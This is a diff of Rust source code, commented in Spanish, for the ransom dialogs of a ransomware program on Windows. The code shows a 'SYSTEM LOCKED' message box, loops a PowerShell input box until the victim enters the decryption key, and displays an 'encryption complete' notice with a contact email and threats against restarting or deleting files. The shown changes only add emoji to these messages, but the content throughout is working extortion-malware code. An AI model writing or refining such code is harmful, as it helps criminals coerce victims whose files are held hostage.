@@ -7,15 +7,15 @@ pub fn show_ransom_dialog(correct_key: &str) -> Result<(), String> {
     use winapi::um::winuser::{MessageBoxW, MB_ICONWARNING, MB_OK, MB_SYSTEMMODAL, MB_TOPMOST};
 
     // Mostrar primer mensaje de advertencia
-    let title = wide_string(" SYSTEM LOCKED");
+    let title = wide_string("🔒 SYSTEM LOCKED");
     let message_text = format!(
-        "  YOUR FILES HAVE BEEN ENCRYPTED  \n\n\
+        "⚠️  YOUR FILES HAVE BEEN ENCRYPTED  ⚠️\n\n\
          All your important files are now encrypted with military-grade encryption.\n\n\
-          To recover your files, you need the decryption key.\n\n\
-          Check RANSOM_NOTE.txt in the encrypted directories for instructions.\n\n\
+         🔑 To recover your files, you need the decryption key.\n\n\
+         📝 Check RANSOM_NOTE.txt in the encrypted directories for instructions.\n\n\
          Contact: EMAIL\n\n\
-          DO NOT restart your computer or delete any files.\n\
-          This is your only warning!\n\n\
+         ❌ DO NOT restart your computer or delete any files.\n\
+         ❌ This is your only warning!\n\n\
          Press OK to enter the decryption key."
     );
     let message = wide_string(&message_text);
@@ -33,7 +33,7 @@ pub fn show_ransom_dialog(correct_key: &str) -> Result<(), String> {
     loop {
         let ps_script = r#"Add-Type -AssemblyName Microsoft.VisualBasic;
 [Microsoft.VisualBasic.Interaction]::InputBox(
-' YOUR FILES HAVE BEEN ENCRYPTED!
+'🔐 YOUR FILES HAVE BEEN ENCRYPTED! 🔐
 
 To recover your files, enter the decryption key below.
 
@@ -41,7 +41,7 @@ Check RANSOM_NOTE.txt for the key.
 
 Contact: EMAIL
 
-  WARNING: Do not restart or your data will be lost permanently!',
+⚠️  WARNING: Do not restart or your data will be lost permanently!',
 'DECRYPTION KEY REQUIRED',
 '')"#;
 
@@ -55,7 +55,7 @@ Contact: EMAIL
 
                 if user_key.is_empty() {
                     // Usuario canceló o no ingresó nada
-                    let error_title = wide_string(" ERROR");
+                    let error_title = wide_string("❌ ERROR");
                     let error_msg = wide_string(
                         "You must enter the decryption key to recover your files!\n\n\
                          Without the key, your files cannot be recovered.\n\n\
@@ -75,7 +75,7 @@ Contact: EMAIL
 
                 if user_key == correct_key {
                     // Key correcta!
-                    let success_title = wide_string(" SUCCESS");
+                    let success_title = wide_string("✅ SUCCESS");
                     let success_msg = wide_string(
                         "Key accepted! Your files are being decrypted...\n\n\
                          Please wait while your files are restored.\n\
@@ -93,7 +93,7 @@ Contact: EMAIL
                     return Ok(());
                 } else {
                     // Key incorrecta
-                    let error_title = wide_string(" INVALID KEY");
+                    let error_title = wide_string("❌ INVALID KEY");
                     let error_msg = wide_string(
                         "The key you entered is incorrect!\n\n\
                          Please check RANSOM_NOTE.txt and try again.\n\n\
@@ -113,7 +113,7 @@ Contact: EMAIL
             }
             Err(_) => {
                 // Si falla PowerShell, mostrar error y reintentar
-                let error_title = wide_string(" ERROR");
+                let error_title = wide_string("❌ ERROR");
                 let error_msg = wide_string(
                     "Failed to show input dialog. Retrying...\n\n\
                      Make sure PowerShell is available on your system.",
@@ -141,13 +141,13 @@ pub fn show_encryption_complete_dialog(key_hint: &str) -> Result<(), String> {
 
     let title = wide_string("🔒 ENCRYPTION COMPLETE");
     let message_text = format!(
-        "  YOUR FILES HAVE BEEN ENCRYPTED  \n\n\
+        "⚠️  YOUR FILES HAVE BEEN ENCRYPTED  ⚠️\n\n\
          {} files have been encrypted with military-grade encryption.\n\n\
-          Key ID: {}...\n\n\
-          Check RANSOM_NOTE.txt for full instructions.\n\n\
-          Contact: ransomware@protonmail.com\n\n\
-          DO NOT restart or shutdown your computer\n\
-          DO NOT delete any files or RANSOM_NOTE.txt\n\n\
+         🔑 Key ID: {}...\n\n\
+         📝 Check RANSOM_NOTE.txt for full instructions.\n\n\
+         📧 Contact: ransomware@protonmail.com\n\n\
+         ❌ DO NOT restart or shutdown your computer\n\
+         ❌ DO NOT delete any files or RANSOM_NOTE.txt\n\n\
          Your files can be recovered with the correct decryption key.",
         "Multiple",
         &key_hint[..16.min(key_hint.len())]
